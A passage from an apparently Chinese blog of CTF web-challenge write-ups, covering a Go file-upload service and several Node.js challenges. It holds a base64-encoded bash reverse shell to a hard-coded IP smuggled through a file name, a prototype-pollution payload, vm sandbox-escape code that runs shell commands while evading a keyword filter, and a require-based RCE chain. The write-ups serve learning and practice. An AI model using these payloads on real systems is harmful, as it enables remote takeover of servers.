&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">compileJava</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br><span class="hljs-comment">// 检查请求方法是否为POST</span><br><span class="hljs-keyword">if</span> r.Method != http.MethodPost &#123;<br>http.Error(w, <span class="hljs-string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 解析multipart/form-data格式的表单数据</span><br>err := r.ParseMultipartForm(<span class="hljs-number">10</span> &lt;&lt; <span class="hljs-number">20</span>) <span class="hljs-comment">// 设置最大文件大小为10MB</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Error parsing form&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 从表单中获取上传的文件</span><br>file, handler, err := r.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Error retrieving file&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> file.Close()<br><br><span class="hljs-keyword">if</span> isFilenameBlacklisted(handler.Filename) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Invalid filename: contains blacklisted character&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="hljs-string">&quot;.java&quot;</span>) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Invalid file format, please select a .java file&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br>err = saveFile(file, <span class="hljs-string">&quot;./upload/&quot;</span>+handler.Filename)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Error saving file&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">saveFile</span><span class="hljs-params">(file multipart.File, filePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">// 创建目标文件</span><br>f, err := os.Create(filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> f.Close()<br><br><span class="hljs-comment">// 将上传的文件内容复制到目标文件中</span><br>_, err = io.Copy(f, file)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>对用户名进行比较严格的过滤，这里猜测通过用户名实现<code>RCE</code>。(感觉知识掌握的还是不太好，当时没想到这个利用点：既然他对用户名过滤了这么多，他为什么这么做呢？)。后端逻辑可能类似执行<code>javac filename.java</code>这种。</p><p>反弹<code>shell</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1;<span class="hljs-built_in">echo</span> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNTUuMTQuMTM0LzkwMDEgMD4mMSIgfCBiYXNo= | <span class="hljs-built_in">base64</span> -d | bash;1.java<br></code></pre></td></tr></table></figure><p><img src="/img/hnctf6.png" alt="hnctf6"></p><p>提示flag在<code>/root</code>下，<code>/memorandum</code>下存在密码，<code>su</code>切到<code>root</code>再输入密码即可读取<code>flag</code>：</p><p><img src="/img/hnctf7.png" alt="hnctf7"></p><p>官方<code>wp</code>没弹<code>shell</code>：</p><p><a href="https://blog.moran233.xyz/index.php/2024/05/14/83/moran/#GoJava">Gojava</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最近做的几道JS题</title>
    <link href="/2024/04/20/2024-4-20-%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E4%B8%80%E4%BA%9BJS%E9%A2%98/"/>
    <url>/2024/04/20/2024-4-20-%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E4%B8%80%E4%BA%9BJS%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>几道JS题</p><span id="more"></span><p><a href="https://xz.aliyun.com/t/10457">参考文章</a></p><h2 id="2024VCTF"><a href="#2024VCTF" class="headerlink" title="2024VCTF"></a>2024VCTF</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 引入Express框架和Node.js的文件系统模块，以及body-parser库用于解析HTTP请求体</span><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><br><span class="hljs-comment">// 创建一个Express应用实例</span><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br><br><span class="hljs-comment">// 使用body-parser中间件来解析URL编码的请求体，并设置其对复杂对象的深度解析</span><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<br>    <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span><br>&#125;));<br><br><span class="hljs-comment">// 使用body-parser中间件来解析JSON格式的请求体</span><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-comment">// 定义一个处理POST请求的路由，当请求发送到/plz路径时触发</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/plz&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    <span class="hljs-comment">// 从请求体中提取venom对象</span><br>    venom = req.<span class="hljs-property">body</span>.<span class="hljs-property">venom</span><br><br>    <span class="hljs-comment">// 检查venom对象的属性个数是否少于3，并且welcome属性是否等于159753</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(venom).<span class="hljs-property">length</span> &lt; <span class="hljs-number">3</span> &amp;&amp; venom.<span class="hljs-property">welcome</span> == <span class="hljs-number">159753</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 检查venom对象是否有text属性，如果有则返回text的值</span><br>            <span class="hljs-keyword">if</span>(venom.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&quot;text&quot;</span>))&#123;<br>                res.<span class="hljs-title function_">send</span>(venom.<span class="hljs-property">text</span>)<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// 如果没有text属性，则返回&quot;no text detected&quot;</span><br>                res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;no text detected&quot;</span>)<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> &#123;<br>            <span class="hljs-comment">// 如果try块中的代码抛出异常，则检查venom.text是否等于&quot;flag&quot;</span><br>            <span class="hljs-keyword">if</span> (venom.<span class="hljs-property">text</span>==<span class="hljs-string">&quot;flag&quot;</span>) &#123;<br>                <span class="hljs-comment">// 如果是，则读取文件系统中的&quot;/flag&quot;文件，并返回包含文件内容的消息</span><br>                <span class="hljs-keyword">let</span> flag=fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>                res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Congratulations:&quot;</span>+flag);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 如果不是，或者try块中的代码抛出了异常，但不满足条件，则返回&quot;Nothing here!&quot;</span><br>                res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;Nothing here!&quot;</span>)<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果venom对象的属性个数不少于3或welcome属性不等于159753，则返回&quot;happy game&quot;</span><br>        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;happy game&quot;</span>);<br>    &#125;<br>&#125;)<br><br><span class="hljs-comment">// 定义一个处理GET请求的路由，当请求发送到根路径时触发</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<br><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-comment">// 发送一个包含HTML的响应，其中包括一个表单，该表单通过POST请求发送到/plz路径</span><br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;&lt;title&gt;oldjs&lt;/title&gt;&lt;a&gt;Hack me plz&lt;/a&gt;&lt;br&gt;&lt;form action=&quot;/plz&quot; method=&quot;POST&quot;&gt;text:&lt;input type=&quot;text&quot; name=&quot;venom[text]&quot; value=&quot;ezjs&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Hack&quot;&gt;&lt;/form&gt;  &#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">// 启动服务器，监听80端口</span><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`listening at port 80`</span>)<br>&#125;) <br></code></pre></td></tr></table></figure><p>限制了venom对象的属性个数少于3，并且welcome属性是否等于159753。想拿flag还需venom.text&#x3D;&#x3D;”flag”的同时抛出一个异常。</p><p>属性个数可以利用原型链污染绕过，接下来考虑如何令venom.hasOwnProperty(“text”)抛出异常：</p><p>venom[hasOwnProperty]&#x3D;Jay17：这部分将venom对象的hasOwnProperty属性设置为1。正常情况下，hasOwnProperty是一个继承自Object.prototype的方法，用于检查对象是否拥有特定的自有属性。通过将它设置为一个字符串，venom.hasOwnProperty(“text”)的调用将会失败，因为hasOwnProperty已不再是一个函数。所以进入catch块</p><p>payload:</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">venom<span class="hljs-comment">[__proto__]</span><span class="hljs-comment">[welcome]</span>=159753&amp;venom<span class="hljs-comment">[text]</span>=flag&amp;venom<span class="hljs-comment">[hasOwnProperty]</span>=1<br></code></pre></td></tr></table></figure><h2 id="NKCTF"><a href="#NKCTF" class="headerlink" title="NKCTF"></a>NKCTF</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br>app<br>.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>))<br>.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/public&#x27;</span>)))<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/home.html&#x27;</span>);<br>&#125;)<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">let</span> pattern = <span class="hljs-regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;<br>    <span class="hljs-keyword">if</span>(code.<span class="hljs-title function_">match</span>(pattern))&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;what can I say? hacker out!!&quot;</span>);<br>    &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;<br>        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>;<br>        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title function_">waf</span>(code)<br>            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>        &#125; <span class="hljs-keyword">catch</span> (e)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">message</span>);<br>            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./hack&#x27;</span>);<br>        &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/secret&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)&#123;<br>    <span class="hljs-keyword">if</span>(process.<span class="hljs-property">__filename</span> == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(__filename, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(content);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-property">__filename</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(content);<br>    &#125;<br>&#125;)<br><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;listen on 3000&quot;</span>);<br>&#125;)<br><br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQLFxfhkCWDAhrD">沙箱逃逸</a></p><p>简单说就是获取一个沙箱外的对象然后调用<code>constructor</code>属性进而执行命令。这题是<code>vm</code>不涉及<code>vm2</code>沙箱逃逸。</p><p><code>/</code>路由存在<code>Runincontext</code>(注意<code>Object.create(null)</code>，相当于没有this关键字。但根据上面的文章我们知道还可以利用<code>arguments.callee.caller</code>返回沙箱外的一个对象)。可以在沙箱中执行经过<code>waf</code>检测后的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">let</span> pattern = <span class="hljs-regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;<br>    <span class="hljs-keyword">if</span>(code.<span class="hljs-title function_">match</span>(pattern))&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;what can I say? hacker out!!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有可以用来进行恶意重写的函数(用<code>Proxy</code>来劫持属性)</p><p>先写个如果没有waf的EXP：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">`</span><br><span class="hljs-string">    throw new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString();</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">`</span>;<br></code></pre></td></tr></table></figure><p>但注意这里<code>process和exec</code>被过滤了，当时想了很久要怎么绕过，看了这篇文章(但是当时不知道怎么套进去)：</p><p><a href="https://www.anquanke.com/post/id/237032">js绕过</a></p><p>网上看的其它师傅的写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;<br>        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;<br>            <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return procBess&#x27;</span>.replace(<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)</span>))();<br>            <span class="hljs-keyword">const</span> obj = p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_procBess&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>));<br>            <span class="hljs-keyword">const</span> ex = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(obj, <span class="hljs-string">&#x27;exeicSync&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>));<br>            <span class="hljs-keyword">return</span> ex.<span class="hljs-title function_">value</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><p>还有其它方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;<br><br>  <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><br>  <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;<br><br>   <span class="hljs-keyword">const</span> aa = <span class="hljs-string">&#x27;return Process&#x27;</span>.<span class="hljs-title function_">toLowerCase</span>();<br><br>   <span class="hljs-keyword">const</span> bb = <span class="hljs-string">&#x27;child_pRocess&#x27;</span>.<span class="hljs-title function_">toLowerCase</span>();<br><br>   <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params">aa</span>))().<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(bb);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(p, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(p).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;ex&#x27;</span>)))(<span class="hljs-string">&#x27;ls&#x27;</span>));<br><br>  &#125;<br><br>&#125;)<br></code></pre></td></tr></table></figure><p>还有其它解法：<a href="http://49.232.222.195/index.php/archives/714/">参考文章</a></p><p><code>js</code>这种语言太灵活了</p><p>唉，学</p><p>官方<code>wp</code>:(原型链污染+沙箱逃逸)：</p><p>首先<code>process.__filename</code>这东西存在原型链污染(和沙箱逃逸配合):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;<br> <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br> <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;<br> cc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__filename</span> = <span class="hljs-string">&quot;/app/hack.js&quot;</span>;<br> &#125;<br> &#125;)<br><span class="hljs-comment">//hack.js</span><br> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;shell.js&#x27;</span>);<br><span class="hljs-comment">//同理读shell.js</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;shell&quot;</span>);<br><span class="hljs-keyword">const</span> p = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br>p.<span class="hljs-title function_">execSync</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">command</span>);<br></code></pre></td></tr></table></figure><p>然后就是一个[require任意文件包含](<a href="https://hujiekang.top/posts/nodejs-require-rce/#require%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%89%A7%E8%A1%8C">Node.js require () RCE 复现 | Jiekang Hu’s Blog (hujiekang.top)</a>)</p><h2 id="GFCTF2024-cool-index"><a href="#GFCTF2024-cool-index" class="headerlink" title="[GFCTF2024]cool_index"></a>[GFCTF2024]cool_index</h2><p>贴些关键代码，主要逻辑就是注册时输入用户名和注册码，后端会进行校验，如果注册码等于特定值就会给<code>premium</code>身份，否则就是<code>guest</code>身份。<code>premium</code>用户能看<code>flag</code></p><p>贴些关键代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//server.js</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/register&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> &#123; username, voucher &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username === <span class="hljs-string">&quot;string&quot;</span> &amp;&amp; (!voucher || <span class="hljs-keyword">typeof</span> voucher === <span class="hljs-string">&quot;string&quot;</span>)) &#123;<br>        <span class="hljs-keyword">const</span> subscription = (voucher === <span class="hljs-variable constant_">FLAG</span> + <span class="hljs-variable constant_">JWT_SECRET</span> ? <span class="hljs-string">&quot;premium&quot;</span> : <span class="hljs-string">&quot;guest&quot;</span>);<br>        <span class="hljs-keyword">if</span> (voucher &amp;&amp; subscription === <span class="hljs-string">&quot;guest&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;邀请码无效&quot;</span> &#125;);<br>        &#125;<br>        <span class="hljs-keyword">const</span> userToken = jwt.<span class="hljs-title function_">sign</span>(&#123; username, subscription &#125;, <span class="hljs-variable constant_">JWT_SECRET</span>, &#123;<br>            <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&quot;1d&quot;</span>,<br>        &#125;);<br>        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&quot;token&quot;</span>, userToken, &#123; <span class="hljs-attr">httpOnly</span>: <span 